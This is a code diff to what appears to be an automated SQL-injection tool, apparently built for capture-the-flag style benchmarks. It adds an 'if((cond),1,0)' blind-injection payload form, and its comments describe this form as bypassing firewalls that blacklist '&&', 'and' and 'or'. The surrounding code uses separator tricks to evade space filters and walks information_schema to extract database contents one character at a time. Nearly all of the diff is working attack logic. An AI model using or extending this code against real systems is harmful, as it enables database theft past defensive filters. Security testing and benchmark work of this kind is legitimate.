@@ -74,10 +74,13 @@ _SQLI_UNION_SENTINEL_BASE = 918200  # distinctive ints unlikely to occur natural
 # character at a time via a page-diff oracle. Unlike UNION extraction it needs
 # no reflected column, and unlike the sqlmap path it needs no external binary.
 _BLIND_SEPARATORS = (" ", "/**/", "\n", "\t", "\x0b", "\x0c", "\r")
-_BLIND_CONTEXTS = ("numeric", "string_single", "string_double")
+_BLIND_CONTEXTS = ("numeric", "string_single", "string_double", "conditional_if")
+# ``conditional_if`` synthesises no logic operator, so the separator flavour is
+# irrelevant — probing it against every separator would only burn oracle budget.
+_BLIND_SEP_INDEPENDENT_CONTEXTS = frozenset({"conditional_if"})
 _BLIND_PRINTABLE_LO = 31   # exclusive lower bound for a binary search over 32..126
 _BLIND_PRINTABLE_HI = 127  # exclusive upper bound
-_BLIND_MAX_ORACLE_PROBES = 48
+_BLIND_MAX_ORACLE_PROBES = 64
 _BLIND_MAX_EXTRACT_REQUESTS = 1400
 _BLIND_MAX_STR_LEN = 96
 _BLIND_TABLES_EXPR = (
@@ -153,7 +156,15 @@ def _blind_wrap_payload(context: str, condition: str, sep: str) -> str:
     quote and comment out the trailing quote (``1'&&(cond)#``). ``sep`` is the
     separator flavour (space, ``/**/`` or a raw control char) inserted around the
     logic operator so a space-blacklist can be side-stepped.
+
+    ``conditional_if`` uses no logic operator at all: it makes the whole numeric
+    parameter ``if((cond),1,0)`` so the row resolves to the valid baseline id
+    when the condition holds and to a non-existent id otherwise. This is the
+    canonical bypass for a WAF that blacklists ``&&``/``and``/``or`` outright
+    (e.g. HackWorld) where every conjunction-style oracle is rejected wholesale.
     """
+    if context == "conditional_if":
+        return f"if(({condition}),1,0)"
     body = f"{sep}&&{sep}({condition}){sep}"
     if context == "numeric":
         return f"1{body}"
@@ -682,6 +693,8 @@ class SQLiExecutorMixin:
             base_sig = _blind_normalize_body(await self._blind_raw_submit(target, point, str(point["base"]), budget))
             for context in _BLIND_CONTEXTS:
                 for sep in _BLIND_SEPARATORS:
+                    if context in _BLIND_SEP_INDEPENDENT_CONTEXTS and sep != _BLIND_SEPARATORS[0]:
+                        continue
                     if budget.get("n", 0) >= _BLIND_MAX_ORACLE_PROBES:
                         return None
                     true_body = await self._blind_raw_submit(
@@ -838,9 +851,11 @@ class SQLiExecutorMixin:
         The sqlmap path fails on keyword+space blacklists (HackWorld-class) whose
         WAF rejects sqlmap's payload templates outright, so the parameter reads as
         "not injectable" even though it is. This extractor synthesises keyword-lean,
-        space-free boolean oracles (``&&``/``||`` logic, parenthesised sub-queries,
-        ``/**/``/control-char separators, ``substr``/``mid`` + ``ascii``/``ord``
-        alternates), establishes a page-diff oracle, then reconstructs data one
+        space-free boolean oracles (``&&`` conjunction or ``if((cond),1,0)``
+        conditional-response for WAFs that blacklist ``&&``/``and`` outright,
+        parenthesised sub-queries, ``/**/``/control-char separators,
+        ``substr``/``mid`` + ``ascii``/``ord`` alternates), establishes a page-diff
+        oracle, then reconstructs data one
         character at a time — needing neither a reflected UNION column nor an
         external binary. Bounded schema walk: ``database()`` (also calibrating the
         function flavour) -> ``information_schema`` tables -> columns -> row blob,
